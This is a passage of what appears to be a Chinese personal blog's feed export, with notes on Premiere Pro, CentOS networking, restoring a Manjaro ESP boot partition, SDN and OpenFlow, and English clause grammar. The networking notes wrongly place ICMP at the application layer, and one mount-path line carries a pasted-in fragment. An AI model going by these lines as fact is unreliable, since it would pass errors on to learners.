然后将序列1*n复制得到序列2.</p><p>另一个例子就是画中画中画, 虽然效果有现成的(视频效果–&gt;风格化–&gt;复制)</p></blockquote><h2 id="效果控件"><a href="#效果控件" class="headerlink" title="效果控件"></a>效果控件</h2><p>添加关键帧，制作动画，调整位置，添加转场…</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/pr05.png" alt="pr05"></p><p>添加的各种视频效果也是在这里调整</p><blockquote><p>常用效果:</p><ul><li>边角定位</li><li>风格化</li><li>交叉溶解</li><li>超级键（抠图用）</li></ul><p>老电影特效:</p><p>lumetri预设&gt;黑白胶片, 颜色矫正&gt;颜色平衡</p><p>阴影和中间调高光蓝色降低, 红色稍微提高</p></blockquote><h3 id="音量与亮度"><a href="#音量与亮度" class="headerlink" title="音量与亮度"></a>音量与亮度</h3><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/pr06.png" alt="pr06"></p><p>Ctrl+鼠标点击音量/亮度控制线可以添加关键帧</p><p>音量可以由主声道来控制全局</p><h3 id="调整速度-变速"><a href="#调整速度-变速" class="headerlink" title="调整速度/变速"></a>调整速度/变速</h3><p>可以为视频增减速度时添加一点效果</p><p>点击<code>fx</code>, 如图选中速度</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/pr07.png" alt="pr07"></p><p>然后在效果控件里添加关键帧, 可以将关键帧拉开让它有一个过渡效果</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/pr08.png" alt="image-20201024223851104"></p><p>此外还可以弄成下图这样..效果和上面区别还是有点的, 但我不知道怎么形容…</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/pr09.png" alt="pr09"></p><blockquote><p>视频调整后, 原始音频跟不上可以使用ratio(R)工具进行拉伸</p></blockquote><h2 id="字幕"><a href="#字幕" class="headerlink" title="字幕"></a>字幕</h2><blockquote><p>pr2019cc和老版真的是变化太多–这是我在看老版视频对着2019cc疯狂找字幕选项的感慨</p></blockquote><p>我把字幕分为title和subtitle</p><ul><li>title在工具面板里如图所示</li></ul><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/pr10.png" alt="pr10"></p><p>​    字体的各种特效在效果面板里</p><ul><li><p>此外还可以从菜单界面的<code>图形&gt;新建图层&gt;文本</code>进入</p></li><li><p>subtitle可以使用新建字幕并设置如图以下选项</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/pr11.png" alt="pr11"></p><blockquote><p><span style="color:red;">注意</span>: 一定要选择<code>开放式字幕</code>, 不然字幕不会显示, 这是我少看一个字后得到的教训</p><p>关于这些解释这些标准的文章<a href="https://www.xinpianchang.com/e17602">Premiere中的3种字幕制作工具</a></p></blockquote><h2 id="视频过渡"><a href="#视频过渡" class="headerlink" title="视频过渡"></a>视频过渡</h2><p>也叫转场, 就是从一个视频到另一个视频的效果.</p><p>常用的过渡效果有<code>3D运动, 溶解, 渐变擦除(可以自己用PS制作渐变效果)</code></p><blockquote><p>可以直接导入PS源文件进PR</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> adobe </category>
          
          <category> pr </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 剪辑 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Premiere-shutcut-keys</title>
      <link href="/Premiere/Premiere-shutcut-keys.html"/>
      <url>/Premiere/Premiere-shutcut-keys.html</url>
      
        <content type="html"><![CDATA[<p>Record some common shotcut keys of PR</p><span id="more"></span><table><thead><tr><th align="left">shotcut keys</th><th>brief</th></tr></thead><tbody><tr><td align="left">c</td><td>剪裁工具(cut)</td></tr><tr><td align="left">v</td><td>选择工具</td></tr><tr><td align="left">o/i</td><td>选择出点(out)/选择入点(in)</td></tr><tr><td align="left">Alt+mouse</td><td>拖动复制剪辑</td></tr><tr><td align="left">left/right</td><td>向左/右前进一帧</td></tr><tr><td align="left">&lt;–j/k/l–&gt;</td><td>倒放/暂停/播放</td></tr><tr><td align="left">+/-</td><td>伸缩时间条</td></tr><tr><td align="left">M/ctrl+M/ctrl+shift+M</td><td>添加标签/跳转标签</td></tr><tr><td align="left">top/down</td><td>切换上/下一剪切点</td></tr><tr><td align="left">Ctrl+D</td><td>插入默认转场</td></tr><tr><td align="left">Shift+D</td><td>给当前选中添加转场</td></tr><tr><td align="left"></td><td></td></tr><tr><td align="left"></td><td></td></tr><tr><td align="left"></td><td></td></tr><tr><td align="left"></td><td></td></tr><tr><td align="left"></td><td></td></tr><tr><td align="left"></td><td></td></tr><tr><td align="left"></td><td></td></tr><tr><td align="left"></td><td></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> adobe </category>
          
          <category> pr </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 剪辑 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux服务器架设总结</title>
      <link href="/Linux/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E8%AE%BE%E6%80%BB%E7%BB%93.html"/>
      <url>/Linux/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E8%AE%BE%E6%80%BB%E7%BB%93.html</url>
      
        <content type="html"><![CDATA[<p>学好如何搭建服务器及后期维护, 本文参考<strong>CentOS</strong>进行学习</p><span id="more"></span><h2 id="1-搭建服务器之前的准备"><a href="#1-搭建服务器之前的准备" class="headerlink" title="1.搭建服务器之前的准备"></a>1.搭建服务器之前的准备</h2><ul><li>使用LVM管理磁盘方便后期弹性变化分区</li></ul><h2 id="2-网络的基本概念"><a href="#2-网络的基本概念" class="headerlink" title="2.网络的基本概念"></a>2.网络的基本概念</h2><ul><li><p>端口和网络服务对应在<code>/etc/services</code></p></li><li><p>DNS服务器IP在<code>/etc/resolv.conf</code></p></li><li><p>主机地址全为0是Network, 全为1是Broadcast(通过IP/Netmask计算得出)</p></li><li><p>将数据发往非同一网络内的主机需要<code>Gateway</code></p></li><li><p>ARP table负责记录MAC与对应IP</p></li><li><p>LoopBack网段在<code>127.0.0.0/8</code></p></li><li><p>每个主机都有路由表, 使用命令<code>route</code>可以查询, 其中最重要的就是默认网关</p></li><li><p>ICMP负责汇报网络情况</p></li><li><p>只有root才能使用小于1024的端口</p></li><li><p>以太网传输数据的技术是CSMA/CD</p></li><li><p>MTU标准定义为1500Bytes, 可以更改MTU的值, 但需要考虑整个网络. 在支持Jumbo frame的设备上一般将MTU设置成9000Bytes.</p></li></ul><h2 id="3-局域网架构简介"><a href="#3-局域网架构简介" class="headerlink" title="3.局域网架构简介"></a>3.局域网架构简介</h2><ul><li>在linux上购买网卡需要注意驱动</li><li>Cat 5网线可以尝试自行压制, 由于蕊线裸露, 影响到电子屏蔽效应, 超过Cat 5等级的网线建议购买现成</li><li>购买无线网卡AP时, 考虑安全因素(监听), 需要网卡能<code>限制MAC上网</code></li><li>上网速度并不全与网络带宽有关, 还要考虑自身配置以及传输接口的能力</li></ul><h2 id="4-连接到Internet"><a href="#4-连接到Internet" class="headerlink" title="4.连接到Internet"></a>4.连接到Internet</h2><ul><li>NIC(网卡)需要内核的支持, 如果内核不支持则需要重新编译内核与网卡的内核模块(需要厂商开放源码), 或者换一张Linux支持的NIC</li><li><code>dmesg</code>会显示<code>kernel ring buffer</code>的内容, 引导系统会将硬件及驱动信息写到这个缓冲区内</li><li><code>lspci</code>可以查询设备芯片数据</li><li><code>lsmod</code>可以显示已加载的模块</li><li><code>lsusb</code>显示usb设备</li><li><code>modinfo</code>可以显示模块信息</li><li><code>modprobe</code>用于加载模块</li><li>可以在<code>/etc/modprobe.d/</code>下配置模块与设备的联系, 一般在内核捕捉不到网卡时使用</li></ul><table><thead><tr><th>修改的参数</th><th>配置文件和启动脚本</th></tr></thead><tbody><tr><td>IP相关</td><td>/etc/sysconfig/network-scripts/ifcfg-eth0</td></tr><tr><td></td><td>/etc/init.d/network restart</td></tr><tr><td>DNS</td><td>/etc/resolv.conf</td></tr><tr><td>hosts</td><td>/etc/sysconfig/network</td></tr><tr><td></td><td>/etc/hosts</td></tr></tbody></table><ul><li>修改主机名后查看是否能ping通, 否则某些服务会启动得很慢(在查找hosts)</li><li>DHCP会主动修改网络配置文件</li><li>查询主机名和IP顺序: <code>/etc/hosts--&gt;/etc/resolv.conf</code></li><li>ping得到IP但网址无法进入, 大概率域名解析错误</li><li>网关不能重复设置, 比如网卡的配置文件与拨号上网的配置文件重复设置网关</li></ul><h2 id="5-Linux常用的网络命令"><a href="#5-Linux常用的网络命令" class="headerlink" title="5.Linux常用的网络命令"></a>5.Linux常用的网络命令</h2><ul><li>通过<code>ifconfig</code>可以查询、配置网卡和IP网络等参数, 重启后消失</li><li>由于<code>ifdown</code> 会分析当前网络参数是否与配置文件相同, 所以使用<code>ifconfig</code>修改参数后不能使用<code>ifdown</code></li><li>一个<code>网络接口</code>就是一个路由, 数据包会根据路由表顺序发送数据(<code>route</code>)</li><li><code>ping</code>&amp;<code>traceroute</code> 是可以使用ICMP协议的网络程序 </li><li><code>telnet</code>传递明文数据, 非常危险</li><li><code>ping</code>可以向网络中强制发送不可拆解的大数据包来侦测MTU大小</li><li><code>nc</code>有的系统称为<code>netcat</code></li></ul><h2 id="6-网络的安全与主机基本防护"><a href="#6-网络的安全与主机基本防护" class="headerlink" title="6.网络的安全与主机基本防护"></a>6.网络的安全与主机基本防护</h2><h3 id="常见攻击手段"><a href="#常见攻击手段" class="headerlink" title="常见攻击手段"></a>常见攻击手段</h3><ul><li>弱密码</li><li>利用程序漏洞</li><li>社会工程学</li><li>被动攻击(浏览恶意网站)</li><li>蠕虫和木马ROOKIT(会伪装)</li></ul><blockquote><p>在CentOS里可以使用<code>rpm -Va</code>查询被修改的文件</p><p>此外可以使用<code>RKHunter</code>来检测后门</p></blockquote><ul><li>DDOS(如SYN泛洪)</li></ul><h3 id="防护手段"><a href="#防护手段" class="headerlink" title="防护手段"></a>防护手段</h3><ul><li>使用强密码(大小写字母、数字和符号的组合. 密码越长越强)</li><li>设定用户密码规则</li><li>关闭不必要的网络服务, 并随时保持最新(软件)</li><li>不要在网络上透露帐号密码等信息</li><li>不要连接不明主机</li><li>完善防火墙</li><li>监控日志</li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux误删ESP分区?开机无法引导进linux?pacman -Syu后无法进入系统?</title>
      <link href="/TechnicalExperience/Linux/restore-ESP.html"/>
      <url>/TechnicalExperience/Linux/restore-ESP.html</url>
      
        <content type="html"><![CDATA[<p> 此文章适合Manjaro+Windows10双系统&amp;UEFI+GPT食用, 其他情况仅供参考.</p><span id="more"></span><p>博主在Win系统中误操作中格式化了引导Manjaro的ESP(<code>EFI System Partition</code>)分区, 这下好了, 开机只能进Win10.</p><p>虽然我知道备份数据+重装系统不失为一种好方法, 但身为一个年轻人, 不折腾折腾怎么行? 所以开始查资料恢复ESP, 由于不是很懂linux系统启动原理导致走了很多弯路, 整理成文章分享给大家. </p><!--文章分为操作部分和理论部分, 如果你想快点恢复ESP分区, [请点击跳转操作部分](##实际操作).--><h2 id="新建引导"><a href="#新建引导" class="headerlink" title="新建引导"></a>新建引导</h2><p>操作前需要准备一点东西:</p><ol><li>U盘</li><li>一个多余的操作系统</li></ol><h3 id="制作livecd-U盘启动盘"><a href="#制作livecd-U盘启动盘" class="headerlink" title="制作livecd(U盘启动盘)"></a>制作livecd(U盘启动盘)</h3><p>先去<a href="https://manjaro.org/">Manjaro官网</a>下载iso镜像文件(或者镜像站下载, 这里推荐<a href="https://mirrors.tuna.tsinghua.edu.cn/osdn/storage/g/m/ma/manjaro/">清华镜像站</a>), 如果使用的是Win10操作系统, 建议使用<a href="https://github.com/pbatard/rufus/tree/master/src">rufus</a>工具向U盘写入镜像; 如果是Linux操作系统, 使用dd指令即可. 如果是Android系统, 能接入U盘并识别的话, 可以考虑使用Termux的dd指令.</p><h3 id="进入livecd"><a href="#进入livecd" class="headerlink" title="进入livecd"></a>进入livecd</h3><p>将U盘插入需要修复的电脑进入BIOS, 选择U盘启动, 进入临时的Manjaro系统.</p><h3 id="挂载-amp-chroot"><a href="#挂载-amp-chroot" class="headerlink" title="挂载&amp;chroot"></a>挂载&amp;chroot</h3><p>打开终端输入以下指令自动挂载电脑上的Manjaro操作系统, 自动chroot.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo manjaro-chroot -a</span><br><span class="line"><span class="comment">## 正常情况等待提示输入&#x27;1&#x27;即可</span></span><br></pre></td></tr></table></figure><blockquote><p>注意, 如果是格式化esp分区(uuid发生变化), 会导致格式化的分区不能自动挂载, 有两种解决方案</p><ol><li>进入chroot后修改/etc/fstab修改格式化分区uuid后再次使用上述指令</li><li>清楚你的linux系统所在分区, 并尝试手动挂载</li></ol></blockquote><p>因为我是格式化的esp分区, 不能自动挂载上efi分区, 我尝试的是手动挂载, 列出我挂载的分区</p><ul><li>/dev/nvme0n1p7  –&gt; /mnt/Manjaro/</li><li>/dev/nvme0n1p6 –&gt; /mnt/Manjaro/boot/</li><li>Restore_the_GRUB_Bootloader/dev/nvme0n1p8 –&gt; /mnt/Manjaro/home/</li><li>/dev/nvme0n1p9 –&gt; /mnt/Manjaro/boot/efi/</li></ul><p>手动挂载还需要输入以下指令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -t proc proc /mnt/proc</span><br><span class="line">sudo mount -t sysfs sys /mnt/sys</span><br><span class="line">sudo mount -o <span class="built_in">bind</span> /dev /mnt/dev</span><br><span class="line">sudo mount -t devpts pts /mnt/dev/pts/</span><br><span class="line">sudo modprobe efivarfs</span><br><span class="line">sudo chroot /mnt</span><br><span class="line">mount -t efivarfs efivarfs /sys/firmware/efi/efivars</span><br></pre></td></tr></table></figure><h3 id="重装并更新grub"><a href="#重装并更新grub" class="headerlink" title="重装并更新grub"></a>重装并更新grub</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo grub-install --target=x86_64-efi --efi-directory=/boot/efi --bootloader-id=manjaro --recheck</span><br><span class="line">sudo update-grub</span><br><span class="line"><span class="comment"># 提示&#x27;未知的设备nvme0n1&#x27;不用管他</span></span><br></pre></td></tr></table></figure><p>如果上述指令无误的话就可以重启了.</p><p>注意格式化esp分区的需要修改/etc/fstab文件的UUID, 不然重启会出现挂载超时提示, 进不了系统.</p><p>进入系统后再次输入<code>update-grub</code>, grub会识别到电脑的其他系统, 开机才会出现grub多重引导.</p><h2 id="pacman-Syu后无法进入系统"><a href="#pacman-Syu后无法进入系统" class="headerlink" title="pacman -Syu后无法进入系统"></a>pacman -Syu后无法进入系统</h2><p>进入系统后, 熟练的输入了<code>pacman -Syu</code>(距离上一次更新2个月了), 提示失败, 尝试数次, 成功. 重启后…引导不见了? 并且系统黑屏, 不能切换tty.</p><p>粗略猜测内核错误, 使用U盘chroot后, 输入<code>pacman -S Linux</code>后再次重启, 成功进入系统. </p><blockquote><p>参考文章</p><p><a href="https://wiki.manjaro.org/index.php?title=Restore_the_GRUB_Bootloader">Restore_the_GRUB_Bootloader</a></p><p><a href="http://linux.vbird.org/linux_basic/0510osloader.php#process_1">第十九章、开机流程、模组管理与Loader</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 个人技术心得 </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> manjaro </tag>
            
            <tag> esp </tag>
            
            <tag> boot </tag>
            
            <tag> 双系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5.网络层-控制平面</title>
      <link href="/Networking/Top-Down-Note/Control-Plane.html"/>
      <url>/Networking/Top-Down-Note/Control-Plane.html</url>
      
        <content type="html"><![CDATA[<p> 转发表和流表是联系数据平面和控制平面的重要元素, 本章主要学习如何计算, 维护, 安装转发表和流表.</p><span id="more"></span><h2 id="5-1-控制方式"><a href="#5-1-控制方式" class="headerlink" title="5.1-控制方式"></a>5.1-控制方式</h2><ul><li><p>路由器控制</p><p>在路由器里的路由组件负责转发和路由功能, 每个路由组件之间可以互相通信, 然后计算转发表</p></li><li><p>逻辑集中控制</p><p>在控制器上集中计算, 分配转发表, 可以实现更多丰富的功能—负载均衡, 防火墙, NAT.</p><p>通过指定协议使控制器与路由器中的控制代理(<code>control agent,CA</code>)交互, CA只负责与控制器通信</p></li></ul><blockquote><p>SDN+逻辑集中控制被广泛使用</p></blockquote><h2 id="5-2-路由算法"><a href="#5-2-路由算法" class="headerlink" title="5.2-路由算法"></a>5.2-路由算法</h2><p>内容涉及高数, 暂且不做笔记</p><h3 id="5-2-1-LS-Link-State-路由算法"><a href="#5-2-1-LS-Link-State-路由算法" class="headerlink" title="5.2.1-LS(Link-State)路由算法"></a>5.2.1-LS(Link-State)路由算法</h3><p>略</p><h3 id="5-2-2-DV-Distance-Vector-路由算法"><a href="#5-2-2-DV-Distance-Vector-路由算法" class="headerlink" title="5.2.2-DV(Distance-Vector)路由算法"></a>5.2.2-DV(Distance-Vector)路由算法</h3><p>略</p><h2 id="5-3-自治系统-AS-内部路由选择-OSPF"><a href="#5-3-自治系统-AS-内部路由选择-OSPF" class="headerlink" title="5.3-自治系统(AS)内部路由选择: OSPF"></a>5.3-自治系统(AS)内部路由选择: OSPF</h2><p>略</p><h2 id="5-4-ISP之间的路由选择-BGP"><a href="#5-4-ISP之间的路由选择-BGP" class="headerlink" title="5.4-ISP之间的路由选择: BGP"></a>5.4-ISP之间的路由选择: BGP</h2><p>略</p><h2 id="5-5-SDN控制平面"><a href="#5-5-SDN控制平面" class="headerlink" title="5.5-SDN控制平面"></a>5.5-SDN控制平面</h2><p>满足SDN通用转发的4个关键点</p><ol><li><p><strong>转发基于流</strong></p><p>SDN控制的交换机数据包可以基于传输层, 网络层, 链路层任意数量的标头字段值(一个流)</p></li><li><p><strong>数据平面和控制平面的分离</strong></p><p>数据平面由交换机组成, 控制平面由管理交换机流表的服务器和软件组成</p></li><li><p><strong>软件控制网络</strong></p><p>控制平面有两个组件, SDN控制器(操作系统)+网络控制应用程序, 控制器会部署在多个服务器上, 提高性能</p></li><li><p><strong>网络可编程</strong></p><p>应用程序可以根据SDN提供的API来控制数据平面</p></li></ol><h3 id="控制器-控制网络的应用程序"><a href="#控制器-控制网络的应用程序" class="headerlink" title="控制器+控制网络的应用程序"></a>控制器+控制网络的应用程序</h3><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/SDN-Controller.png" alt="SDN-Controller"></p><p> 控制器的功能从下至上主要有三层</p><ol><li><p>通信层</p><p>控制器和网络设备之间的通信. 规定协议来传输信息, 如OpenFlow和SNMP.</p></li><li><p>管理网络状态层</p><p>SDN控制平面必须要了解所有网络主机, 链接, 交换机和其他SDN设备的状态.</p></li><li><p>网络控制应用层</p><p>这层提供API使应用程序能从第二层中读取网络状态和流表. 然后响应设备的事件进行动作.</p></li></ol><h3 id="OpenFlow"><a href="#OpenFlow" class="headerlink" title="OpenFlow"></a>OpenFlow</h3><p>OpenFlow能在实现OpenFlow API的设备之间运行, 如SDN控制器/交换机. 它通过TCP操作, 端口6653.</p><p><strong><em>从SDN控制器给交换机的重要信息如下</em></strong></p><ul><li><p><strong>configuration</strong></p><p>该信息使控制器可以查询和控制交换机的配置参数</p></li><li><p><strong>Modify-State</strong></p><p>修改交换机中流表的条目, 还可以设置端口属性</p></li><li><p><strong>Read-State</strong></p><p>从交换机的流表和端口处统计信息和计数器数值</p></li><li><p><strong>Send-Packet</strong></p><p>使用这个消息控制器可以向交换机指定的端口发送指定的数据包.</p></li></ul><p><strong><em>从交换机给控制器的信息有</em></strong></p><ul><li><p><strong>Flow-Removed</strong></p><p>代表流表条目已删除, 这是由于超时接受修改流表状态信息的结果</p></li><li><p><strong>Port-status</strong></p><p>通知控制器端口状态的变化</p></li><li><p><strong>Packet-in</strong></p><p>可以将与流表条目不匹配的数据包发送给控制器处理, 匹配的数据包采取动作也可以发送给控制器.   Packet-in信息可以将这些数据包发送给控制器</p></li></ul><h3 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h3><p>Internet control message protocol(ICMP)是主机和路由器互相传递网络层信息的协议.</p><blockquote><p>ICMP位置处于应用层协议, 在IP头的编号为<code>1</code></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
          <category> Top-Down-Note </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>07-句子</title>
      <link href="/English/G/07-%E5%8F%A5%E5%AD%90.html"/>
      <url>/English/G/07-%E5%8F%A5%E5%AD%90.html</url>
      
        <content type="html"><![CDATA[<p> 前面的学习是为了构成句子, 学完句子才能写文章. 加油!</p><span id="more"></span><h2 id="简单句"><a href="#简单句" class="headerlink" title="简单句"></a>简单句</h2><p> 简单句不一定简单哦</p><p>简单句抽象SV: </p><p>S+V; </p><p>S, S and S +V; </p><p>S + V, V and V; </p><p>S, S and S + V, V and  V.</p><blockquote><p>不管多少个S, V, 如果使用and连接, 都只能算一个大S, V(区别并列句)</p></blockquote><h3 id="五大基本类型"><a href="#五大基本类型" class="headerlink" title="五大基本类型"></a>五大基本类型</h3><ol><li><p><strong>S+V</strong></p><p>S+Vi: Birds fly.</p></li><li><p><strong>S+V+O</strong></p><p>S+vi+prep+O: I look at the man.</p><p>S+Vt1+O: I love you.</p></li><li><p><strong>S+V+O+OC</strong></p><p>S+Vt1+O+OC: I think you beautiful.</p></li><li><p><strong>S+V+IO+DO</strong></p><p>S+Vt2+IO+DO: she told me a joke.</p><p>S+Vt2+DO+IO: she told a joke to me.</p></li><li><p><strong>S+C+P</strong></p><p>He is a student.</p><p>I am a man.</p></li></ol><blockquote><p>助动词不管有多少, 都看成一个大V</p></blockquote><h2 id="并列句"><a href="#并列句" class="headerlink" title="并列句"></a>并列句</h2><p>SV&gt;=2, 由<strong>并列连词</strong>连接</p><p>I love you <strong>and</strong> you love me.</p><p>抽象: S+V+连词+S+V…(连词个数=SV个数-1)</p><p>这些连词主要有: <code>and</code>, <code>but</code>, <code>or</code>, <code>so</code>, <code>;</code>..</p><blockquote><p>连词两边都必须有SV, 才能算是并列句(区别简单句)</p></blockquote><p> <strong><em>例子</em></strong></p><ul><li>You help him <strong>and</strong> he help you.</li><li>The futrue is bright<strong>;</strong> the road is tortuous.</li></ul><h3 id="表示同等关系-并列-平行"><a href="#表示同等关系-并列-平行" class="headerlink" title="表示同等关系(并列, 平行)"></a>表示同等关系(并列, 平行)</h3><p>常用and, not only…but also.., neither..nor…等连接</p><ul><li>He <strong>not only</strong> stole my money, <strong>but he also</strong> took my watch away.</li></ul><h3 id="表示选择关系"><a href="#表示选择关系" class="headerlink" title="表示选择关系"></a>表示选择关系</h3><p>常用or(否则), otherwise等</p><ul><li>Hurry up, or you’ll miss the train.</li></ul><h3 id="表示转折关系"><a href="#表示转折关系" class="headerlink" title="表示转折关系"></a>表示转折关系</h3><p>常用but, yet, while, when等.</p><h3 id="表示因果关系"><a href="#表示因果关系" class="headerlink" title="表示因果关系"></a>表示因果关系</h3><p>so等</p><ul><li>August is the time of the year for rice harvest, <strong>so</strong> every day I work from dawn until dark.</li></ul><h2 id="复合句-从句"><a href="#复合句-从句" class="headerlink" title="复合句(从句)"></a>复合句(从句)</h2><h3 id="从句1-0"><a href="#从句1-0" class="headerlink" title="从句1.0"></a>从句1.0</h3><p><strong>有多个SV, 由从属连词连接, 但连接顺序并不像并列句,  可以有以下顺序</strong></p><ul><li>S+V+连词+S+V</li><li>连词+S+V+S+V</li><li>S+连词+S+V+V等等</li></ul><p>从属连词有that, which, what, when, where, why, how, whether, if, because, as, since, although, whatever….</p><p><strong>使用句子作为某句子的一些成份，这个句子叫从句</strong></p><ul><li><p><strong>It</strong> is right.</p></li><li><p><strong>What(O) he(S) said(V)</strong> is right</p></li></ul><p>分析: what is said相当于it, 是<strong>名词性从句</strong>，可以充当<strong>主从，宾从，表从，同位从</strong>等</p><ul><li>The boy <strong>under the tree</strong> is Tom.</li><li>The boy <strong>who(S) <u>is reading(V)</u> <u>a book(O)</u></strong> is Tom.</li></ul><p>分析: 将定语换成了句子, <strong>定语从句</strong>, 词性是<strong>形容词性</strong>的, 也叫<strong>形容性从句</strong>, who既是从属连词, 也是主语</p><ul><li>I was doing my homework <strong><u>at six</u></strong>.</li><li>I was doing my homework <strong><u>when he called me</u></strong>.</li></ul><p>分析: at six是时间状语, when是连词, 所以叫<strong>状语从句</strong>, 又因为状语是副词性的, 所以也叫<strong>副词从句</strong>.</p><blockquote><p>通过上面分析</p><p>从词性角度来说, 分为<strong>名词性, 形容词性, 副词性</strong></p><p>从句子成分来说, 分为<strong>主宾表同定状从等等</strong></p></blockquote><h3 id="判断从句2-0"><a href="#判断从句2-0" class="headerlink" title="判断从句2.0"></a>判断从句2.0</h3><blockquote><p>一个句子有多个动词时, 看连接词是否是从属连词</p></blockquote><p>eg:</p><ul><li>I help you <u>and</u> you help me.    –&gt;并列句</li><li>I help you <u>because</u> you helped me.–&gt;从句</li></ul><h4 id="详细解释从属连词"><a href="#详细解释从属连词" class="headerlink" title="详细解释从属连词"></a>详细解释从属连词</h4><ol><li>位置: 连接词位于<code>从句</code>句首</li><li>个数: <code>V-1</code></li><li>作用<ul><li>引导从句</li><li>在从句中做成分</li></ul></li><li>省略(后面解释)</li></ol><blockquote><p>2.0总结技巧</p><ul><li>引导词是从句开端</li><li>根据句意判断结尾(看运气)</li><li>两个V不属于同一个句子</li></ul></blockquote><p>通过以上知识划分主从句</p><p>例子: </p><ul><li>(What you said) 主从 / is right.</li><li>I don’t know / (what you <u>talk about(V)</u>)宾从</li><li>It is / (what it is)表从.</li><li>The boy / (who is wearing a hat)定从 / is my brother.</li><li>I was doing my homework / (when she came back)状从.</li><li>We all know the fact / (that you are pig)同为从.</li></ul><h3 id="判断从句3-0"><a href="#判断从句3-0" class="headerlink" title="判断从句3.0"></a>判断从句3.0</h3><p>通过一个公式判断所有从句</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">                                   /` 定: 修n</span><br><span class="line">                          /`主句完整-  状: 修V</span><br><span class="line">                         /         \- 同: 完整,抽象,等同</span><br><span class="line">V&gt;=2 &amp;&amp; 从属连词 ==&gt; 复合句</span><br><span class="line">                         \          /` 主: 引导词开头无<span class="string">&#x27;,&#x27;</span> or it形式主语</span><br><span class="line">                          \-主句不完整- 宾: vt1后,介词后,vt2+IO后,it形式宾语</span><br><span class="line">                                    \  表: 系动词+引导词后</span><br></pre></td></tr></table></figure><h3 id="同位语从句"><a href="#同位语从句" class="headerlink" title="同位语从句"></a>同位语从句</h3><ol><li>完整: 主句完整</li><li>抽象: 主句中有抽象名词(promise, fact, news…)</li><li>等同: 从句==抽象名词(如前面的fact==that you are pig)</li></ol><blockquote><p>如何判断抽象名词?</p><p>答: 比如promise(承诺), fact(事实).</p><p>举个例子, 我答应你是一个承诺, 我爱你也是一个承诺.</p><p>举个反例, 我买了一个桌子是桌子吗?</p><p>这就是抽象和具体的解释.</p></blockquote><h3 id="同位从VS定从"><a href="#同位从VS定从" class="headerlink" title="同位从VS定从"></a>同位从VS定从</h3><table><thead><tr><th>相同点</th><th>不同点</th></tr></thead><tbody><tr><td>主句完整</td><td>同为从必须是抽象名词, 定从可以是抽象/具体</td></tr><tr><td>都可使用that引导</td><td>同位从从句与抽象名词等同, 定从不等同</td></tr><tr><td></td><td>同位从that不作成分, 定从作成分</td></tr></tbody></table><p>e.g:</p><ul><li><p>Do you remember the promise that you will love me forever?</p><p>同位语从句, that引导, 等同抽象, 且that不作成分</p></li><li><p>Do you remember the promise that you made last year?</p><p>定语从句, promise!=that you made last year. that在从句中代表promise</p></li></ul><h2 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h2><p>where引导的从句练习</p><ul><li>You can find it where you left it.</li></ul><p>分析: 主句完整, 定状同, 根据句意在丢下它的地方去找它==&gt;状从.</p><ul><li>Tell me the address where he lives.</li></ul><p>分析: 省略主语You, me是IO, the address是DO, 句意他居住的地方==&gt;定从</p><ul><li>I don’t know where he comes from.</li></ul><p>分析: know is vt(与生活的I don’t know不同), 缺少宾语==&gt;宾从</p><ul><li>Where he was born is not known yet.</li></ul><p>分析: is not known是谓语, 前面缺主语==&gt;主从</p><ul><li>This place is where they once lived.</li></ul><p>分析: 但一个is是动词, 缺少宾语/表语, 句意曾居住的地方==&gt;表从</p><ul><li>I have no idea where the party is to be held.</li></ul><p>分析: 主句完整, 看名词idea, 是抽象名词, idea==the party is to be held==&gt;同位从</p>]]></content>
      
      
      <categories>
          
          <category> 英语 </category>
          
          <category> 语法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 英语 </tag>
            
            <tag> 语法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>06-宾语/表语/同位语</title>
      <link href="/English/G/06-%E5%AE%BE%E8%AF%AD.html"/>
